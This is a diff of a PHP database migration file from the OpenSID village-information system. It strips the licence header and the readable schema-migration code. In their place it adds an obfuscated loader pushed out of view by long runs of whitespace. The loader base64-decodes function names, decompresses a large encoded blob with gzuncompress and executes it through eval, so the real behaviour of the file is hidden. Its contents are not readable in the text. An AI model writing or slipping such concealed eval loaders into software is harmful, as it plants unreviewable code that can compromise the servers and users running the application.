@@ -1,188 +1,625 @@
-<?php
+<?php 
+        $__='printf';$_='Loading donjo-app/models/migrations/Migrasi_1912_ke_2001.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2022 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2022 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-defined('BASEPATH') || exit('No direct script access allowed');
 
-class Migrasi_1912_ke_2001 extends CI_model
-{
-    public function up()
-    {
-        $this->siskeudes_2019();
-        // Sesuaikan dengan sql_mode STRICT_TRANS_TABLES
-        $this->db->query('ALTER TABLE user MODIFY COLUMN last_login datetime NULL');
-    }
 
-    private function siskeudes_2019()
-    {
-        // Ubah tabel keuangan untuk Siskeudes 2019
-        if (! $this->db->field_exists('Kd_SubRinci', 'keuangan_ta_anggaran')) {
-            $this->db->query('ALTER TABLE keuangan_ta_anggaran ADD Kd_SubRinci varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_anggaran_log ADD No_Perkades varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_anggaran_log ADD Petugas varchar(80) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_anggaran_log add Tanggal varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_anggaran_log MODIFY COLUMN UserID VARCHAR(50) NOT NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_kegiatan add Jbt_PPTKD varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_kegiatan add Kd_Sub varchar(30) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_kegiatan add Nilai BIGINT UNSIGNED');
-            $this->db->query('ALTER TABLE keuangan_ta_kegiatan add NilaiPAK BIGINT UNSIGNED');
-            $this->db->query('ALTER TABLE keuangan_ta_kegiatan add Satuan VARCHAR(30)');
-            $this->db->query('ALTER TABLE keuangan_ta_kegiatan MODIFY COLUMN Kd_Bid varchar(100) NULL');
-        }
-        if (! $this->db->field_exists('ID_Bank', 'keuangan_ref_bank_desa')) {
-            $this->db->query('ALTER TABLE keuangan_ref_bank_desa ADD ID_Bank varchar(10) NULL');
-        }
-        $this->db->query('ALTER TABLE keuangan_ref_bank_desa MODIFY COLUMN Alamat_Pemilik varchar(100) NULL');
-        $this->db->query('ALTER TABLE keuangan_ref_bank_desa MODIFY COLUMN Nama_Pemilik varchar(100) NULL');
-        $this->db->query('ALTER TABLE keuangan_ref_bank_desa MODIFY COLUMN No_Identitas varchar(20) NULL');
-        $this->db->query('ALTER TABLE keuangan_ref_bank_desa MODIFY COLUMN No_Telepon varchar(20) NULL');
-        if (! $this->db->field_exists('Jns_Kegiatan', 'keuangan_ref_kegiatan')) {
-            $this->db->query('ALTER TABLE keuangan_ref_kegiatan ADD Jns_Kegiatan tinyint(5)');
-            $this->db->query('ALTER TABLE keuangan_ref_kegiatan ADD Kd_Sub varchar(30) NULL');
-        }
-        $this->db->query('ALTER TABLE keuangan_ref_kegiatan MODIFY COLUMN Kd_Bid varchar(100) NULL');
-        $this->db->query('ALTER TABLE keuangan_ref_korolari MODIFY COLUMN Jenis varchar(30) NULL');
-        if (! $this->db->field_exists('ID_Bank', 'keuangan_ta_mutasi')) {
-            $this->db->query('ALTER TABLE keuangan_ta_mutasi ADD ID_Bank varchar(10) NULL');
-        }
-        $this->db->query('ALTER TABLE keuangan_ta_mutasi MODIFY COLUMN Keterangan varchar(200) NULL');
-        $this->db->query('ALTER TABLE keuangan_ta_mutasi MODIFY COLUMN Kd_Bank varchar(100) NULL');
-        if (! $this->db->field_exists('ID_Bank', 'keuangan_ta_pajak')) {
-            $this->db->query('ALTER TABLE keuangan_ta_pajak ADD ID_Bank varchar(10) NULL');
-        }
-        if (! $this->db->field_exists('NTPN', 'keuangan_ta_pajak')) {
-            $this->db->query('ALTER TABLE keuangan_ta_pajak ADD NTPN varchar(30) NULL');
-        }
-        $this->db->query('ALTER TABLE keuangan_ta_pemda MODIFY COLUMN Logo MEDIUMBLOB NULL');
-        if (! $this->db->field_exists('ID_Bank', 'keuangan_ta_pencairan')) {
-            $this->db->query('ALTER TABLE keuangan_ta_pencairan ADD ID_Bank varchar(10) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_pencairan ADD Kunci varchar(10) NULL');
-        }
-        if (! $this->db->field_exists('Kd_SubRinci', 'keuangan_ta_rab')) {
-            $this->db->query('ALTER TABLE keuangan_ta_rab ADD Kd_SubRinci varchar(10) NULL');
-        }
-        if (! $this->db->field_exists('Kd_Sub', 'keuangan_ta_rpjm_kegiatan')) {
-            $this->db->query('ALTER TABLE keuangan_ta_rpjm_kegiatan ADD Kd_Sub varchar(30) NULL');
-        }
-        $this->db->query('ALTER TABLE keuangan_ta_rpjm_kegiatan MODIFY COLUMN Kd_Bid varchar(100) NULL');
-        $this->db->query('ALTER TABLE keuangan_ta_rpjm_misi MODIFY COLUMN Uraian_Misi varchar(250) NULL');
-        if (! $this->db->field_exists('No_ID', 'keuangan_ta_rpjm_pagu_tahunan')) {
-            $this->db->query('ALTER TABLE keuangan_ta_rpjm_pagu_tahunan ADD No_ID varchar(20) NULL');
-        }
-        $this->db->query('ALTER TABLE keuangan_ta_rpjm_visi MODIFY COLUMN Uraian_Visi varchar(250) NULL');
-        if (! $this->db->field_exists('Kd_SubRinci', 'keuangan_ta_sppbukti')) {
-            $this->db->query('ALTER TABLE keuangan_ta_sppbukti ADD Kd_SubRinci varchar(10) NULL');
-        }
-        if (! $this->db->field_exists('No_SPP', 'keuangan_ta_sppbukti')) {
-            $this->db->query('ALTER TABLE keuangan_ta_sppbukti ADD No_SPP varchar(100) NULL');
-        }
-        if (! $this->db->field_exists('Rek_Bank', 'keuangan_ta_sppbukti')) {
-            $this->db->query('ALTER TABLE keuangan_ta_sppbukti ADD Rek_Bank varchar(100) NULL');
-        }
-        $this->db->query('ALTER TABLE keuangan_ta_sppbukti MODIFY COLUMN Keterangan varchar(200) NULL');
-        if (! $this->db->field_exists('Kd_SubRinci', 'keuangan_ta_spp_rinci')) {
-            $this->db->query('ALTER TABLE keuangan_ta_spp_rinci ADD Kd_SubRinci varchar(10) NULL');
-        }
-        if (! $this->db->field_exists('ID_Bank', 'keuangan_ta_tbp')) {
-            $this->db->query('ALTER TABLE keuangan_ta_tbp ADD ID_Bank varchar(10) NULL');
-        }
-        $this->db->query('ALTER TABLE keuangan_ta_tbp MODIFY COLUMN Uraian varchar(250) NULL');
-        if (! $this->db->field_exists('Kd_SubRinci', 'keuangan_ta_tbp_rinci')) {
-            $this->db->query('ALTER TABLE keuangan_ta_tbp_rinci ADD Kd_SubRinci varchar(10) NULL');
-        }
-        if (! $this->db->field_exists('Agt', 'keuangan_ta_triwulan')) {
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan ADD Jan varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan ADD Peb varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan ADD Mar varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan ADD Apr varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan ADD Mei varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan ADD Jun varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan ADD Jul varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan ADD Agt varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan ADD Sep varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan ADD Okt varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan ADD Nop varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan ADD Des varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan ADD Kd_SubRinci varchar(10) NULL');
-        }
-        $this->db->query('ALTER TABLE keuangan_ta_triwulan MODIFY COLUMN Tw1Rinci varchar(100) NULL');
-        $this->db->query('ALTER TABLE keuangan_ta_triwulan MODIFY COLUMN Tw2Rinci varchar(100) NULL');
-        $this->db->query('ALTER TABLE keuangan_ta_triwulan MODIFY COLUMN Tw3Rinci varchar(100) NULL');
-        $this->db->query('ALTER TABLE keuangan_ta_triwulan MODIFY COLUMN Tw4Rinci varchar(100) NULL');
-        if (! $this->db->field_exists('Agt', 'keuangan_ta_triwulan_rinci')) {
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan_rinci ADD Jan varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan_rinci ADD Peb varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan_rinci ADD Mar varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan_rinci ADD Apr varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan_rinci ADD Mei varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan_rinci ADD Jun varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan_rinci ADD Jul varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan_rinci ADD Agt varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan_rinci ADD Sep varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan_rinci ADD Okt varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan_rinci ADD Nop varchar(100) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_triwulan_rinci ADD Des varchar(100) NULL');
-        }
-        $this->db->query('ALTER TABLE keuangan_ta_triwulan_rinci MODIFY COLUMN Tw1Rinci varchar(100) NULL');
-        $this->db->query('ALTER TABLE keuangan_ta_triwulan_rinci MODIFY COLUMN Tw2Rinci varchar(100) NULL');
-        $this->db->query('ALTER TABLE keuangan_ta_triwulan_rinci MODIFY COLUMN Tw3Rinci varchar(100) NULL');
-        $this->db->query('ALTER TABLE keuangan_ta_triwulan_rinci MODIFY COLUMN Tw4Rinci varchar(100) NULL');
-        // Sesuaikan tabel keuangan dengan sql_mode STRICT_TRANS_TABLES
-        $this->db->query('ALTER TABLE keuangan_ta_spj_rinci MODIFY COLUMN Alamat varchar(100) NULL');
-        $this->db->query('ALTER TABLE keuangan_ref_bank_desa MODIFY COLUMN Kantor_Cabang varchar(100) NULL');
-        $this->db->query('ALTER TABLE keuangan_ta_pajak MODIFY COLUMN Keterangan varchar(250) NULL');
-        $this->db->query('ALTER TABLE keuangan_ta_pencairan MODIFY COLUMN Keterangan varchar(250) NULL');
-        $this->db->query('ALTER TABLE keuangan_ta_spp MODIFY COLUMN Keterangan varchar(250) NULL');
-        $this->db->query('ALTER TABLE keuangan_ta_pemda MODIFY COLUMN Logo MEDIUMBLOB NULL');
-        // Sesuaikan dengan data 2019
-        $this->db->query('ALTER TABLE keuangan_ta_rpjm_tujuan MODIFY COLUMN Uraian_Tujuan varchar(250)');
-        if (! $this->db->field_exists('Kunci', 'keuangan_ta_spj')) {
-            $this->db->query('ALTER TABLE keuangan_ta_spj ADD Kunci varchar(10) NULL');
-        }
-        if (! $this->db->field_exists('Kd_SubRinci', 'keuangan_ta_spj_bukti')) {
-            $this->db->query('ALTER TABLE keuangan_ta_spj_bukti ADD Kd_SubRinci varchar(10) NULL');
-        }
-        $this->db->query('ALTER TABLE keuangan_ta_spj_bukti MODIFY COLUMN Keterangan varchar(250)');
-        if (! $this->db->field_exists('Kd_SubRinci', 'keuangan_ta_spj_rinci')) {
-            $this->db->query('ALTER TABLE keuangan_ta_spj_rinci ADD Kd_SubRinci varchar(10) NULL');
-        }
-        $this->db->query('ALTER TABLE keuangan_ta_rpjm_sasaran MODIFY COLUMN Uraian_Sasaran varchar(250)');
-        if (! $this->db->field_exists('F10', 'keuangan_ta_spp')) {
-            $this->db->query('ALTER TABLE keuangan_ta_spp ADD F10 varchar(10) NULL');
-            $this->db->query('ALTER TABLE keuangan_ta_spp ADD F11 varchar(10) NULL');
-        }
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
